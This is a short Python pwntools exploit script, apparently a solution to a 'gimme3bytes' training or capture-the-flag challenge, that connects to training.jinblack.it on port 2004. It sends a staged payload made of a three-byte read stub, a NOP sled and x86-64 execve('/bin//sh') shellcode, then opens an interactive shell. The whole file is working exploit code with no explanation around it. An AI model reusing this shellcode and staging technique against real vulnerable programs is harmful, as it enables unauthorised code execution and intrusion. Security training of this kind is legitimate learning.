from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']

context.terminal = ['gnome-terminal', '-e']
#r = process("./gimme3bytes")
#gdb.attach(r, """
#	c
#	""")
r = remote("training.jinblack.it", 2004)

#input("wait")
#print(r.recvuntil("name?\n"))

buffer = 0x404070

read = b"\x5a\x0f\x05"
nop = b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode = b"\x31\xC0\x48\xBB\xD1\x9D\x96\x91\xD0\x8C\x97\xFF\x48\xF7\xDB\x53\x54\x5F\x99\x52\x57\x54\x5E\xB0\x3B\x0F\x05"

payload = read + nop + shellcode
#payload = read + shellcode
r.send(payload)

r.interactive()
